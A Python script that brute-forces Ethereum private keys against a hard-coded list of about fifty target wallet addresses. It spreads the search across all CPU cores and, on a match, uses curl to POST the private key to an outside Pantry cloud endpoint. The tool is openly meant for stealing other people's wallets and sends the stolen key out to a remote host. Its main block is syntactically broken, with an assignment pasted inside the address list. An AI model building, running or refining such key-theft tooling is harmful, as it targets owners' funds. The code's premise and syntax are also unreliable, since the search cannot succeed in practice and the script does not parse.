import os
import ecdsa
from Crypto.Hash import keccak
from concurrent.futures import ProcessPoolExecutor, as_completed
import subprocess
import json
from itertools import count

def keccak256(data):
    """Calculate the Keccak-256 hash."""
    k = keccak.new(digest_bits=256)
    k.update(data)
    return k.digest()

def generate_eth_address():
    """Generate a random Ethereum address and its corresponding private key."""
    private_key = os.urandom(32)  # Secure random number generator
    signing_key = ecdsa.SigningKey.from_string(private_key, curve=ecdsa.SECP256k1)
    public_key = signing_key.get_verifying_key().to_string()
    eth_address = '0x' + keccak256(public_key)[-20:].hex()
    return private_key.hex(), eth_address

def check_address(target_address, counter):
    """Continuously generate Ethereum addresses and check if they match the target."""
    for i in counter:
        private_key, eth_address = generate_eth_address()
        print(f"[{i}] Private Key: {private_key}, Address: {eth_address}")  # Print the current private key and address
        
        if eth_address.lower() == target_address.lower():  # Check for match (case-insensitive)
            return private_key, eth_address

def post_to_pantry(private_key, eth_address):
    """Post the private key and Ethereum address to the Pantry API."""
    data = {
        "user": {
            "id": 123,
            "name": "John Doe",
            "email": "john.doe@example.com"
        },
        "private_key": private_key,
        "eth_address": eth_address,
        "notes": "Match found!"
    }
    json_data = json.dumps(data)
    
    curl_command = [
        'curl', '-X', 'POST', '-H', 'Content-type: application/json',
        '-d', json_data,
        'https://getpantry.cloud/apiv1/pantry/123581d0-cf4c-48d2-b426-904e8e6ef00f/basket/testBasket'
    ]

    subprocess.run(curl_command)

def brute_force(target_addresses, num_workers):
    """Brute-force the private key using multiprocessing."""
    with ProcessPoolExecutor(max_workers=num_workers) as executor:
        # Create a shared counter across workers
        counter = count(1)
        futures = {executor.submit(check_address, address, counter): address for address in target_addresses}

        for future in as_completed(futures):
            private_key, eth_address = future.result()
            print(f"Match found for address {futures[future]}!")
            print(f"Private Key: {private_key}")
            print(f"Ethereum Address: {eth_address}")
            post_to_pantry(private_key, eth_address)
            return

if __name__ == "__main__":
    target_addresses = [
        '0x21a31Ee1afC51d94C2eFcCAa2092aD1028285549',
        # Define the target address
target_address =            '0x21a31Ee1afC51d94C2eFcCAa2092aD1028285549',
  '0x4838B106FCe9647Bdf1E7877BF73cE8B0BAD5f97',
    '0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE',
    '0xAF0bC19d09EDD1509Ddd3e087162b6C0749dA764',
    '0x95222290DD7278Aa3Ddd389Cc1E1d165CC4BAfe5',
    '0x8641dF2D7C730A8A24db86693fc39F7A74Dd4e9D',
    '0xEfA06f99DfECfc0236eD7398CE57656cAB732780',
    '0x388C818CA8B9251b393131C08a736A67ccB19297',
    '0xF2f5C73fa04406b1995e397B55c24aB1f3eA726C',
    '0x62d4d3785f8117Be8d2eE8e1e81C9147098bC3fF',
    '0xd4E96eF8eee8678dBFf4d535E033Ed1a4F7605b7',
    '0x5638cbdC72bd8554055883D309CFc70357190CF3',
    '0x1f9090aaE28b8a3dCeaDf281B0F12828e676c326',
    '0xa2EA63e16515A595E22808d2584FC1b76d2c9695',
    '0xdf99A0839818B3f120EBAC9B73f82B617Dc6A555',
    '0xDB66794cBD3873D8c419749c4c2cc3bC0dF00e7A',
    '0x6e2C509D522d47F509E1a6D75682E6AbBC38B362',
    '0x7DbfeD5686847113b527DC215DBA4E332DF8cc6c',
    '0x123B9747eDE9DB10F64e0C5C6fd0f5aC68A0A806',
    '0xceB69F6342eCE283b2F5c9088Ff249B5d0Ae66ea',
    '0x2a11fC3B141fd492A7702d53147962a8ea1A9e7C',
    '0xE2113d222f6fb6b93FBd84763b516C117058C669',
    '0x7e2a2FA2a064F693f0a55C5639476d913Ff12D05',
    '0x7f88C8E221bbDB5Ca91268ccAc567b0b0E5b9d4D',
    '0xB6Dd6c3680E29cF35fA4829CA75769F9dB100D11',
    '0x42D57f6C1706Ac106dB53cf70cF579D789014f28',
    '0x44aa241bB898ec1c8de1F2Bc844cebc3903311BA',
    '0x48319f97E5Da1233c21c48b80097c0FB7a20Ff86',
    '0xD87f3d6c5624E8B02bE13c2C92f8511B88B94d96',
    '0xedC6BacdC1e29D7c5FA6f6ECA6FDD447B9C487c9',
    '0xB10EdD6fa6067DbA8d4326F1c8f0d1C791594F13',
    '0xa83114A443dA1CecEFC50368531cACE9F37fCCcb',
    '0xfFEE087852cb4898e6c3532E776e68BC68b1143B',
    '0x10a875977681139AF02e24a56E597dA3de09A882',
    '0xb5d85CBf7cB3EE0D56b3bB207D5Fc4B82f43F511',
    '0x36928500Bc1dCd7af6a2B4008875CC336b927D57',
    '0x95Ba4cF87D6723ad9C0Db21737D862bE80e93911',
    '0x2ACEFfd4ed029814A712893CAe3a76e865165b4E',
    '0x77EDAE6A5f332605720688C7Fda7476476e8f83f',
    '0x3328F7f4A1D1C57c35df56bBf0c9dCAFCA309C49',
    '0x055C48651015Cf5b21599a4DED8c402Fdc718058',
    '0x75B77Dc8f8ae1286b4E36160152830754d59682C',
    '0x3A10dC1A145dA500d5Fba38b9EC49C8ff11a981F',
    '0xB3912b20b3aBc78C15e85E13EC0bF334fbB924f7',
    '0x25aB3Efd52e6470681CE037cD546Dc60726948D3',
    '0x0dA2082905583cEdFfFd4847879d0F1Cf3d25C36',
    '0x51C72848c68a965f66FA7a88855F9f7784502a7F',
    '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    '0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C'
    ]
  
    num_workers = os.cpu_count()  # Use all available CPU cores

    print(f"Starting brute force with {num_workers} workers...")
    brute_force(target_addresses, num_workers)